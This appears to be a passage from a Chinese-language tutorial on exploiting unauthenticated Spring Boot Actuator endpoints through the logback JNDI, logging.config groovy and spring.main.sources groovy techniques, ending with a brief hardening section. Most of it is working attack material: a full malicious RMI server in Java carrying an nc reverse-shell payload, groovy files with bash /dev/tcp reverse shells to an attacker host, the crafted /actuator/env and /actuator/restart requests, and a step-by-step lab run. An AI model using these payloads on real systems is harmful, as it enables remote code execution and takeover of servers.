**步骤一：托管 xml 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以 `xml` 结尾的  `example.xml` 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：

```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://your-vps-ip:1389/jndi" as="appName" />
</configuration>
```



**步骤二：托管RMI服务及代码**

编写优化过后的用来反弹 shell 的JAVA代码(只需修改代码中的服务监听端口和反弹shell的ip地址及其端口)

```
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port xxxxx");//RMI服务监听地址
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx xxxx >/tmp/f']).start()\")"));
         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```



将上面反弹shell的JAVA代码进行打包成jar包

```
mvn clean install
或者
javac xxxxxxx.java
jar -cvf  xxxx.jar -C src/ .
```



**步骤三:  启动RMI服务**

指定开启连接RMI服务的主机IP地址，架设RMI服务

```
java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar
```



**步骤三：设置 logging.config 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

logging.config=http://your-vps-ip/example.xml
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"logging.config","value":"http://your-vps-ip/example.xml"}
```



**步骤四：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json

```



##### 利用实例

编写example.xml文档，访问192.168.233.242的RMI服务，放置在开启WEB服务的根目录下

```
<configuration>
<insertFromJNDI env-entry-name="rmi://192.168.233.242:8090/jndi" as="appName"/>
</configuration>
```



然后使用python开启个简单的http服务

```
python2  SimpleHTTPServer  -m 80
```



编写恶意RMI服务的反弹shell的JAVA代码,当用户访问该RMI服务时会导致使用nc连接到攻击者的主机，实现反向shell连接

代码如下:

```
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 8090");//RMI服务监听地址为8090
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.233.242 1234 >/tmp/f']).start()\")"));
         
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```



将该代码进行maven打包

```
mvn install
```

![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204556955.png)



然后指定访问ip地址开启RMI服务

```
java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar
```

![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210830204855751.png)



使用nc监听端口

```
nc -lvvp 1234
```



POST方式构造请求包对/actuator/env发出请求，设置logging.config为前面example.xml的请求地址

![image-20210831165413164](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831165413164.png)



然后再访问/actuator/restart端点重新启动项目加载变量

![image-20210831165556609](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831165556609.png)



此时就会看到连接shell成功

![image-20210831165644535](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831165644535.png)



##### 利用原理

- 目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址
- restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容
- 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
- xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
- 目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞



#### 2.11. restart logging.config groovy RCE

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/restart` 接口重启应用
- ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
- ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
- ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出



##### 利用方法

**步骤一：托管 groovy 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以 `groovy` 结尾的  `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：

```xml
Runtime.getRuntime().exec("执行代码")
```



**步骤二：设置 spring.main.sources 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

logging.config=http://your-vps-ip/example.groovy
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"logging.config","value":"http://your-vps-ip/example.groovy"}
```



**步骤三：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json

```





##### 利用实例

编写groovy文件并将其放在http服务根目录下

```
Runtime.getRuntime().exec("bash -i >& /dev/tcp/192.168.233.242/1234 0>&1")
```



使用python开启http服务

```
python2  -m  SimpleHTTPServer  80
```



以POST的方式向/actuator/env请求，设置logging.config为groovy的url地址

请求报文如下

```
POST /actuator/env HTTP/1.1
Host: 192.168.233.242:9098
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 83

{"name":"logging.config","value":"http://192.168.233.242:8080/example.groovy"}
```

![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831181920688.png)



在攻击主机上监听1234端口

```
nc -lvvp 1234
```



然后向/actuator/restart请求重启项目

![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180134395.png)



可以看到目标主机反向连接成功

![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180922722.png)







##### 利用原理

- 目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址

- restart 重启应用后，程序会请求设置的 URL 地址

- logback-classic` 组件的 `ch.qos.logback.classic.util.ContextInitializer.java` 代码文件逻辑中会判断 url 是否以 `groovy` 结尾

- 如果 url 以 `groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞

  



#### 2.12. restart spring.main.sources groovy RCE

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/restart` 接口重启应用
- ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出
- ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出
- ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出



##### 利用方法

**步骤一：托管 groovy 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以 `groovy` 结尾的  `example.groovy` 文件，内容为需要执行的 groovy 代码，比如：

```xml
Runtime.getRuntime().exec("执行代码")
```



**步骤二：设置 spring.main.sources 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.main.sources=http://your-vps-ip/example.groovy
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.main.sources","value":"http://your-vps-ip/example.groovy"}
```



**步骤三：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json

```



##### 利用实例

编写groovy文件并将其放在http服务根目录下

```
Runtime.getRuntime().exec("bash -i >& /dev/tcp/192.168.233.242/1234 0>&1")
```



使用python开启http服务

```
python2  -m  SimpleHTTPServer  80
```



以POST的方式向/actuator/env请求，设置spring.main.sources为groovy的url地址

请求报文如下

```
POST /actuator/env HTTP/1.1
Host: 192.168.233.242:9098
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 83

{"name":"spring.main.sources","value":"http://192.168.233.242:8080/example.groovy"}
```

![image-20210831175940842](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831175940842.png)



在攻击主机上监听1234端口

```
nc -lvvp 1234
```



然后向/actuator/restart请求重启项目

![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180134395.png)



可以看到目标主机反向连接成功

![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831180922722.png)



##### 利用原理

- 目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址
- restart 重启应用后，程序会请求设置的 URL 地址
- spring-boot` 组件中的 `org.springframework.boot.BeanDefinitionLoader.java` 文件代码逻辑中会判断 url 是否以 `.groovy` 结尾
- 如果 url 以 `.groovy` 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞





# 3.安全措施

### **3.1开启security依赖功能**

在项目的pom.xml文件下引入spring-boot-starter-security依赖

```
<dependency>

<groupId>org.springframework.boot\</groupId>

<artifactId>spring-boot-starter-security</artifactId>

</dependency>
```

![](media/b01ec604e001e1de3f668bcd86398f62.png)

然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。

```
management.security.enabled=true

security.user.name=admin

security.user.password=admin
```

![](media/808449fe71e832550f82817c0ae5b3a4.png)

### **3.2**禁用接口

如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上Spring
Boot也提供了安全限制功能。比如要禁用/env接口，则可设置如下：

endpoints.env.enabled= false

如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：

```
endpoints.enabled = false

endpoints.metrics.enabled = true
```

